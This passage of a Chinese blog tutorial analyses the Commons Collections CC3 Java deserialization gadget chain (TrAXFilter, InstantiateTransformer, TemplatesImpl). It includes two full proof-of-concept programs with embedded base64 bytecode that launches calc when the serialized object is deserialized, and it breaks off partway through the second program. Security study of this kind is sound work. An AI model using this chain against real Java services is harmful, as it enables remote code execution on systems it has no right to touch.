&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="为什么需要CC3"><a href="#为什么需要CC3" class="headerlink" title="为什么需要CC3"></a>为什么需要CC3</h2><ol><li>在反序列化漏洞被挖掘出来后，类似SerialKiller这样的过滤⼯具随之诞⽣</li><li>通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类: InvokerTransformer赫然在列，对CC1和高版本使用的CC6都做出了截断，所以<strong>使用CC3来进行绕过</strong></li></ol><h2 id="com-sun-org-apache-xalan-internal-xsltc-trax-TrAXFilter"><a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TrAXFilter" class="headerlink" title="com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</h2><blockquote><p>cc3利用的主要类</p></blockquote><ol><li><p>idea看看类</p><ol><li>在TrAXFilter这个类的构造函数中自动调用了<code>templates.newTransformer()</code></li><li>只要我们传入的模板是一个TemplatesImpl实例的话(并设置paylaod)，则可以调用payload</li><li><strong>Q: 下一步呢？</strong>: 按照思路是找一个方法中调用这个构造函数并且参数可控，有点难搞<ol><li>A: ysoserial的方法是找到了一个<strong>可以调用构造函数的Transformer: InstantiateTransformer</strong></li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Templates              _templates;</span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line">    <span class="keyword">private</span> TransformerHandlerImpl _transformerHandler;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">_useServicesMechanism</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><ol><li><p>还是idea看看源码</p><ol><li>这个transformer主要通过<code>getInstance()</code>来获取转换器对象，提供了两个构造函数，看源码就ok了<ol><li>private无参</li><li>public有参</li></ol></li><li>重点还得看看这里的<code>transform()</code>方法，是原本CC1和CC6中的触发点，可以看到这里可以获取到的只是<strong>公有的构造函数，私应该不行，并且会直接调用newInstance()方法，返回的是这个类的对象而不是这个类(是一个坑)<strong>，可以用来调用TrAXFilter的public构造函数并直接传入我们构造好的对象 –&gt; 这里不好直接用TemplatesImpl公有构造函数来实现，</strong>难以设置paylaod，再套一层比较容易进行操作</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何构造ChainedTransformers"><a href="#如何构造ChainedTransformers" class="headerlink" title="如何构造ChainedTransformers?"></a>如何构造ChainedTransformers?</h2><blockquote><p>这里由于有点忘记前面的分析导致卡住了一会，先给出构造方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] trueTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;</span>)),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li><p>回到ChainedTransformer的<code>transform()</code></p><ol><li>可以知道每次会<code>transform(上一次的Object)</code></li><li>这里第二个InstantiateTransfomer调用的transform是会调用上一次的结果，这里的一个类对象，刚好和InstantiateTransformer中的transform的参数要求一致</li><li><strong>解答误解</strong>: 并不是Object.transform()，CC1和CC6中的Runtime可能产生了误解</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="如何进行序列化？"><a href="#如何进行序列化？" class="headerlink" title="*如何进行序列化？"></a>*如何进行序列化？</h2><blockquote><p>!!!无法序列化的类可以仿照Runtime的解决方式，通过反射来实现</p></blockquote><ol><li><strong>Q: 注意到<code>TrAXFilter</code>这一个类并没有实现Serializable接口</strong><ol><li>A：这里的解决方式和Runtime一样，通过反射实现，并没有传输一个TrAXFilter对象，而是传输了Class对象，并通过InstantiateTransformer调用构造函数并返回实例</li></ol></li></ol><h2 id="CC3-poc"><a href="#CC3-poc" class="headerlink" title="CC3 poc"></a>CC3 poc</h2><blockquote><p>版本：只⽀持Java 8u71及以下版本</p></blockquote><ol><li><p>首先亮出<strong>Gadget</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的Gadget是LazyMap的</span></span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    AnnotationInvocationHandler.readObject()</span><br><span class="line">            AnnotationInvocationHandler.invoke()</span><br><span class="line">                LazyMap.get()</span><br><span class="line">                    ChainedTransformer.transform()</span><br><span class="line">                        TemplatesImpl#newTransformer()</span><br><span class="line">                            TemplatesImpl#getTransletInstance()</span><br><span class="line">                                TemplatesImpl#defineTransletClasses()</span><br><span class="line">                                    TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></li><li><p>直接写poc吧，TemplatesImpl和再3(2)中是一样的，条件不再分析了</p><blockquote><p>借鉴自p牛，由版本限制，但是可以仿照CC6进行修改</p></blockquote> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_p</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">            setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;Base64.decode(</span><br><span class="line">                    <span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>)&#125;);</span><br><span class="line">            setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">            <span class="comment">// setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">// p牛的严谨性使用了伪装</span></span><br><span class="line">            Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">            setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">            <span class="comment">// ==================</span></span><br><span class="line">            <span class="comment">// 生成序列化字符串</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 本地测试触发</span></span><br><span class="line">            <span class="comment">// System.out.println(barr);</span></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>bfengj大佬对CC3链在版本中使用的改造，使用CC6同种逻辑</p></blockquote> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_bfengj_improved</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code =  Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span>+</span><br><span class="line">                                            <span 